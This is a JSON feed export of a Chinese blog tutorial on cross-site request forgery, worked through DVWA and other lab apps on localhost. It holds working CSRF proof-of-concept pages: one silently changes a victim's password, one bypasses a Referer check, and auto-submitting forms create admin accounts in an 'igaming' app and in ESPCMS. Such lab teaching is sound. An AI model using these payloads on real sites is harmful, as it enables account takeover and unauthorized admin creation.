{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"csrf跨站请求伪造\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E9%AA%8C/",
            "url": "https://kiyomijin.github.io/2022/10/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E9%AA%8C/",
            "title": "CSRF原理及体验",
            "date_published": "2022-10-20T18:22:48.000Z",
            "content_html": "<h1 id=\"csrf原理及体验\"><a class=\"markdownIt-Anchor\" href=\"#csrf原理及体验\">#</a> CSRF 原理及体验</h1>\n<p><code>CSRF</code>  的全称是 <code>Cross-site request forgery</code> ，即跨站请求伪造。<br>\n<strong>定义为</strong>：攻击者在一定的攻击条件下，利用被攻向服务器发起请求，服务器可以正常解析并返回正确结果。</p>\n<p><img src=\"image-20221021000820032.png\" alt=\"image-20221021000820032\"></p>\n<blockquote>\n<p>被攻击者在【网站 A】处于登陆状态<br>\n必需要在【网站 A】同浏览器中打开黑客提供的链接<br>\n后台身份验证不严格（例如除 cookie 外无其他验证）</p>\n</blockquote>\n<p>那么， <code>CSRF</code>  能做什么事情呢？</p>\n<ul>\n<li>发邮件</li>\n<li>发消息</li>\n<li>财产操作比如转账，或者购买商品</li>\n<li>修改密码</li>\n<li>删除文章</li>\n</ul>\n<h1 id=\"csrf防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf防御\">#</a> CSRF 防御</h1>\n<p><img src=\"image-20221021001447634.png\" alt=\"image-20221021001447634\"></p>\n<h1 id=\"csrf初体验\"><a class=\"markdownIt-Anchor\" href=\"#csrf初体验\">#</a> CSRF 初体验</h1>\n<p>我们使用 <code>Low</code>  安全等级</p>\n<p><img src=\"image-20221021004134735.png\" alt=\"image-20221021004134735\"></p>\n<p>在重置密码这里输入 <code>123456</code> 、 <code>123456</code></p>\n<p>照常理，理应在后台存储新密码成功后，我们下次登录是使用 <code>123456</code>  来登录</p>\n<p>在此时我们新起一个虚拟主机，将此段代码弄成一个 <code>html</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> im = <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tim.<span class=\"property\">src</span> =  <span class=\"string\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;timg.jpeg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到这段代码的原理是：</p>\n<p>在 <code>timg.jpeg</code>  这张铺满整个屏幕的图片上，设置了一个 <code>onclick</code>  事件，当点击时会调用 <code>abc()</code>  函数。</p>\n<p><code>abc</code>  函数主要是利用点击图片时利用 <code>html</code>  解析图片的 <code>src</code>  过程而发起了一个请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221021004955949.png\" alt=\"image-20221021004955949\"></p>\n<p>使得刚刚用户修改的密码，变成了新的 <code>1234567</code></p>\n<p>因此，我们如果使用 <code>123456</code>  登录，势必会登录失败</p>\n<p><img src=\"image-20221021004042743.png\" alt=\"image-20221021004042743\"></p>\n<p>当我们使用 <code>1234567</code>  来登录时，是成功的，这样一来就完成了 <code>CSRF</code>  跨站伪造攻击。</p>\n<p>我们查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// Get input</span></span><br><span class=\"line\">\t<span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">\t<span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// They do!</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_object</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((<span class=\"title function_ invoke__\">trigger_error</span>(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">\t\t<span class=\"variable\">$pass_new</span> = <span class=\"title function_ invoke__\">md5</span>( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Update the database</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class=\"title function_ invoke__\">dvwaCurrentUser</span>() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class=\"title function_ invoke__\">is_object</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? <span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = <span class=\"title function_ invoke__\">mysqli_connect_error</span>()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$html</span> .= <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$html</span> .= <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t((<span class=\"title function_ invoke__\">is_null</span>(<span class=\"variable\">$___mysqli_res</span> = <span class=\"title function_ invoke__\">mysqli_close</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，整个代码都是在对 <code>MYSQL</code>  进行修改操作，在密码的获取上没有做任何的<strong>来源验证</strong></p>\n<p>因此黑客可以使用同一个浏览器伪造请求来完成 <code>CSRF</code>  攻击</p>\n<h1 id=\"csrf-referer校验绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf-referer校验绕过\">#</a> CSRF Referer 校验绕过</h1>\n<p>题目是 <code>DVWA-Medium</code>  的 <code>CSRF</code></p>\n<p>我们直接来看一下源码是怎么增加保护的：</p>\n<p><img src=\"image-20221021010151443.png\" alt=\"image-20221021010151443\"></p>\n<p>想法挺好，但是依旧不够安全。</p>\n<p><strong>绕过思路</strong>：只要 <code>Referer</code>  里构造好黑客的 <code>1234567</code>  新密码请求后，添加上源服务器名就好了。</p>\n<p>我们首先尝试一下抓取点击图片触发的请求：</p>\n<p><img src=\"image-20221021010600349.png\" alt=\"image-20221021010600349\"></p>\n<p>这里的 Referer 会被后台的条件过滤掉，没法通过，原因在于整个字符串中没有源服务器名</p>\n<p><strong>注意</strong>：这里假设源服务器已经使用了另外的域名</p>\n<p><strong>那么我们可以把黑客的 html 命名为源服务器名，这样就可以过条件</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/threezh1/csrf/127.0.0.1.html</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221021010912169.png\" alt=\"image-20221021010912169\"></p>\n<p><code>Password Changed！</code>  可以使用 <code>1234567</code>  登录</p>\n<p>附上代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> im = <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tim.<span class=\"property\">src</span> =  <span class=\"string\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;timg.jpeg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"csrf-post请求绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf-post请求绕过\">#</a> CSRF POST 请求绕过</h1>\n<p>请求抓包</p>\n<p><img src=\"image-20221021022012970.png\" alt=\"image-20221021022012970\"></p>\n<p>发现 do 参数的值是 <code>add_confirm</code></p>\n<p><img src=\"image-20221021020531959.png\" alt=\"image-20221021020531959\"></p>\n<p>我们查看一下源码</p>\n<p><img src=\"image-20221021020803462.png\" alt=\"image-20221021020803462\"></p>\n<p>发现只是 <code>SQL</code>  语句的执行并提取相应的字段进行插入</p>\n<p>并未对 <code>CSRF</code>  的漏洞点做校验，因此可以攻击。</p>\n<p>当我们成功在一个浏览器中访问后</p>\n<p><img src=\"image-20221021015609544.png\" alt=\"image-20221021015609544\"></p>\n<p>我们使用如下代码生成的 html 页面进行绕过：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> f=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;test&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tf.<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://127.0.0.1/igaming/admin/users.php?do=add_confirm&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pseudo&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack@gmail.com&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fname&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&#x27;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;lname&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123456&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>原理是：</p>\n<p>使用 <code>onload</code>  事件当页面访问时就进行 <code>form</code>  表单提交</p>\n<p>其中 <code>form</code>  表单的 <code>action</code>  就是直接发起一个请求，请求的内容使用<strong> BP 抓包获取值</strong>进行自定义修改成 <code>input</code>  标签使用</p>\n<p><img src=\"image-20221021020354290.png\" alt=\"image-20221021020354290\"></p>\n<p>另一个题目的解法，也是一样的原理</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> f=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;test&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tf.<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://127.0.0.1/espcms/adminsoft/index.php?archive=management&amp;action=managesava&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;inputclass&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;add&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;tab&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhongzhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password2&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhongzhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;powergroup&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;inputclassid&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;isremote&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "CSRF跨站请求伪造"
            ]
        }
    ]
}